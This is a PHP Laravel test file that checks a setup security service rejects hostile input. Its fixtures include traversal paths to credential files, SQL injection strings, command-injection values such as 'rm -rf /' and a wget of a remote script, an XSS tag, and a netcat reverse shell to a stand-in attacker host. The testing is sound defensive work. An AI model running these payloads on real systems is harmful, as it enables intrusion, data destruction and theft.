<?php

namespace Tests\Feature;

use App\Services\SetupSecurityService;
use App\Services\EnvironmentFileService;
use App\Services\SetupService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;
use Tests\TestCase;

class SetupSecurityTest extends TestCase
{
    use RefreshDatabase;

    private SetupSecurityService $securityService;
    private EnvironmentFileService $environmentFileService;
    private SetupService $setupService;

    protected function setUp(): void
    {
        parent::setUp();
        
        $this->securityService = app(SetupSecurityService::class);
        $this->environmentFileService = app(EnvironmentFileService::class);
        $this->setupService = app(SetupService::class);
    }

    /** @test */
    public function path_validation_blocks_directory_traversal_attempts()
    {
        $dangerousPaths = [
            '../../../etc/passwd',
            '..\\..\\..\\Windows\\System32\\config\\SAM',
            '/etc/shadow',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            '../../../../var/log/auth.log'
        ];

        foreach ($dangerousPaths as $path) {
            $result = $this->securityService->validateAndSanitizePath($path);
            
            $this->assertFalse($result['valid'], "Should reject dangerous path: {$path}");
            $this->assertNotEmpty($result['violations'], "Should have violations for: {$path}");
        }
    }

    /** @test */
    public function path_validation_allows_safe_paths()
    {
        $safePaths = [
            'setup/state.json',
            'backups/backup-2025-01-01.json',
            'logs/setup.log',
            'temp/upload.tmp'
        ];

        foreach ($safePaths as $path) {
            $result = $this->securityService->validateAndSanitizePath($path, storage_path('app'));
            
            $this->assertTrue($result['valid'], "Should allow safe path: {$path}");
            $this->assertEmpty($result['violations'], "Should have no violations for: {$path}");
        }
    }

    /** @test */
    public function database_config_sanitization_removes_dangerous_characters()
    {
        $dangerousConfig = [
            'database' => 'test_db; DROP TABLE users; --',
            'username' => 'admin\'; DELETE FROM users; --',
            'password' => 'pass$(rm -rf /)',
            'host' => 'localhost; cat /etc/passwd',
            'port' => '3306; nc -e /bin/sh attacker.com 4444'
        ];

        $result = $this->securityService->sanitizeDatabaseConfig($dangerousConfig);
        
        $this->assertStringNotContainsString(';', $result['sanitized']['database']);
        $this->assertStringNotContainsString('--', $result['sanitized']['database']);
        $this->assertStringNotContainsString('\'', $result['sanitized']['username']);
        $this->assertStringNotContainsString('$(', $result['sanitized']['password']);
        $this->assertStringNotContainsString(';', $result['sanitized']['host']);
        $this->assertEquals(3306, $result['sanitized']['port']);
    }

    /** @test */
    public function admin_user_input_sanitization_validates_email_format()
    {
        $invalidInputs = [
            ['email' => 'not-an-email'],
            ['email' => 'test@'],
            ['email' => '@domain.com'],
            ['email' => 'test..test@domain.com'],
            ['email' => 'test@domain'],
        ];

        foreach ($invalidInputs as $input) {
            $result = $this->securityService->sanitizeAdminUserInput($input);
            
            $this->assertNotEmpty($result['violations'], "Should reject invalid email: {$input['email']}");
        }
    }

    /** @test */
    public function admin_user_input_sanitization_allows_valid_data()
    {
        $validInput = [
            'name' => 'John Doe',
            'email' => 'john.doe@example.com',
            'password' => 'SecurePassword123!'
        ];

        $result = $this->securityService->sanitizeAdminUserInput($validInput);
        
        $this->assertEmpty($result['violations']);
        $this->assertEquals('John Doe', $result['sanitized']['name']);
        $this->assertEquals('john.doe@example.com', $result['sanitized']['email']);
        $this->assertEquals('SecurePassword123!', $result['sanitized']['password']);
    }

    /** @test */
    public function storage_config_sanitization_removes_invalid_characters()
    {
        $dangerousConfig = [
            'client_id' => 'client123<script>alert("xss")</script>',
            'client_secret' => 'secret456; rm -rf /'
        ];

        $result = $this->securityService->sanitizeStorageConfig($dangerousConfig);
        
        $this->assertStringNotContainsString('<script>', $result['sanitized']['client_id']);
        $this->assertStringNotContainsString(';', $result['sanitized']['client_secret']);
        $this->assertStringNotContainsString('rm', $result['sanitized']['client_secret']);
    }

    /** @test */
    public function secure_file_write_validates_path_and_creates_directories()
    {
        $testPath = 'setup/test-file.json';
        $testContent = '{"test": "data"}';

        $result = $this->securityService->secureFileWrite($testPath, $testContent);
        
        $this->assertTrue($result['success']);
        $this->assertEmpty($result['violations']);
        
        $fullPath = storage_path('app/' . $testPath);
        $this->assertFileExists($fullPath);
        $this->assertEquals($testContent, file_get_contents($fullPath));
        
        // Cleanup
        File::delete($fullPath);
    }

    /** @test */
    public function secure_file_write_rejects_dangerous_paths()
    {
        $dangerousPath = '../../../etc/passwd';
        $testContent = 'malicious content';

        $result = $this->securityService->secureFileWrite($dangerousPath, $testContent);
        
        $this->assertFalse($result['success']);
        $this->assertNotEmpty($result['violations']);
        $this->assertStringContainsString('Invalid file path', $result['message']);
    }

    /** @test */
    public function secure_file_read_validates_path_and_reads_content()
    {
        $testPath = 'setup/test-read-file.json';
        $testContent = '{"read": "test"}';
        
        // Create test file first
        $fullPath = storage_path('app/' . $testPath);
        File::ensureDirectoryExists(dirname($fullPath));
        File::put($fullPath, $testContent);

        $result = $this->securityService->secureFileRead($testPath);
        
        $this->assertTrue($result['success']);
        $this->assertEquals($testContent, $result['content']);
        $this->assertEmpty($result['violations']);
        
        // Cleanup
        File::delete($fullPath);
    }

    /** @test */
    public function secure_file_read_rejects_dangerous_paths()
    {
        $dangerousPath = '../../../etc/passwd';

        $result = $this->securityService->secureFileRead($dangerousPath);
        
        $this->assertFalse($result['success']);
        $this->assertNotEmpty($result['violations']);
        $this->assertStringContainsString('Invalid file path', $result['message']);
    }

    /** @test */
    public function environment_variable_validation_rejects_dangerous_patterns()
    {
        $dangerousValues = [
            '$(rm -rf /)',
            '`cat /etc/passwd`',
            '${HOME}/malicious',
            'value || rm -rf /',
            'value && cat /etc/shadow',
            'value; wget malicious.com/script.sh'
        ];

        foreach ($dangerousValues as $value) {
            $result = $this->securityService->validateEnvironmentVariable('TEST_VAR', $value);
            
            $this->assertFalse($result['valid'], "Should reject dangerous value: {$value}");
            $this->assertNotEmpty($result['violations'], "Should have violations for: {$value}");
        }
    }

    /** @test */
    public function environment_variable_validation_allows_safe_values()
    {
        $safeValues = [
            'simple_value',
            'value-with-dashes',
            'value.with.dots',
            'value_with_underscores',
            'Value With Spaces',
            'https://example.com/path?param=value'
        ];

        foreach ($safeValues as $value) {
            $result = $this->securityService->validateEnvironmentVariable('TEST_VAR', $value);
            
            $this->assertTrue($result['valid'], "Should allow safe value: {$value}");
            $this->assertEmpty($result['violations'], "Should have no violations for: {$value}");
        }
    }

    /** @test */
    public function setup_session_validation_requires_all_fields()
    {
        $incompleteSession = [
            'setup_started_at' => now()->toISOString(),
            // Missing setup_token and current_step
        ];

        $result = $this->securityService->validateSetupSession($incompleteSession);
        
        $this->assertFalse($result['valid']);
        $this->assertNotEmpty($result['violations']);
    }

    /** @test */
    public function setup_session_validation_rejects_expired_sessions()
    {
        $expiredSession = [
            'setup_started_at' => now()->subHours(3)->toISOString(), // 3 hours ago
            'setup_token' => 'valid_token_format_12345678901234567890',
            'current_step' => 'database'
        ];

        $result = $this->securityService->validateSetupSession($expiredSession);
        
        $this->assertFalse($result['valid']);
        $this->assertContains('Setup session has expired', $result['violations']);
    }

    /** @test */
    public function setup_session_validation_accepts_valid_sessions()
    {
        $validSession = [
            'setup_started_at' => now()->subMinutes(30)->toISOString(),
            'setup_token' => 'valid_token_format_12345678901234567890',
            'current_step' => 'database'
        ];

        $result = $this->securityService->validateSetupSession($validSession);
        
        $this->assertTrue($result['valid']);
        $this->assertEmpty($result['violations']);
    }

    /** @test */
    public function secure_token_generation_creates_unique_tokens()
    {
        $tokens = [];
        
        for ($i = 0; $i < 10; $i++) {
            $token = $this->securityService->generateSecureToken();
            $this->assertEquals(32, strlen($token));
            $this->assertMatchesRegularExpression('/^[a-zA-Z0-9]+$/', $token);
            $this->assertNotContains($token, $tokens);
            $tokens[] = $token;
        }
    }

    /** @test */
    public function security_events_are_logged_properly()
    {
        Log::shouldReceive('channel')
            ->with('security')
            ->once()
            ->andReturnSelf();
            
        Log::shouldReceive('info')
            ->with('Setup security event: test_event', \Mockery::type('array'))
            ->once();

        $this->securityService->logSecurityEvent('test_event', [
            'test_context' => 'test_value'
        ]);
    }

    /** @test */
    public function setup_service_validates_input_with_security_checks()
    {
        $dangerousInput = [
            'database' => 'test; DROP TABLE users;',
            'username' => 'admin\'; --',
            'password' => 'pass$(malicious)'
        ];

        $result = $this->setupService->validateSetupInput('database', $dangerousInput);
        
        $this->assertNotEmpty($result['violations']);
        $this->assertStringNotContainsString(';', $result['sanitized']['database'] ?? '');
    }

    /** @test */
    public function setup_service_creates_secure_sessions()
    {
        $sessionData = $this->setupService->createSecureSetupSession();
        
        $this->assertArrayHasKey('setup_token', $sessionData);
        $this->assertArrayHasKey('setup_started_at', $sessionData);
        $this->assertArrayHasKey('current_step', $sessionData);
        $this->assertEquals(32, strlen($sessionData['setup_token']));
        $this->assertEquals('assets', $sessionData['current_step']);
    }

    /** @test */
    public function setup_service_validates_sessions_properly()
    {
        // Create a valid session first
        $this->setupService->createSecureSetupSession();
        
        $validation = $this->setupService->validateSetupSession();
        
        $this->assertTrue($validation['valid']);
        $this->assertEmpty($validation['violations']);
    }

    /** @test */
    public function setup_service_clears_sessions_securely()
    {
        // Create a session first
        $this->setupService->createSecureSetupSession();
        
        // Verify it exists
        $validation = $this->setupService->validateSetupSession();
        $this->assertTrue($validation['valid']);
        
        // Clear the session
        $this->setupService->clearSetupSession();
        
        // Verify it's gone
        $validation = $this->setupService->validateSetupSession();
        $this->assertFalse($validation['valid']);
    }

    /** @test */
    public function setup_security_status_reports_comprehensive_information()
    {
        $status = $this->setupService->getSetupSecurityStatus();
        
        $this->assertArrayHasKey('environment_file_secure', $status);
        $this->assertArrayHasKey('setup_state_secure', $status);
        $this->assertArrayHasKey('session_valid', $status);
        $this->assertArrayHasKey('backups_available', $status);
        $this->assertArrayHasKey('violations', $status);
        $this->assertIsArray($status['violations']);
    }
}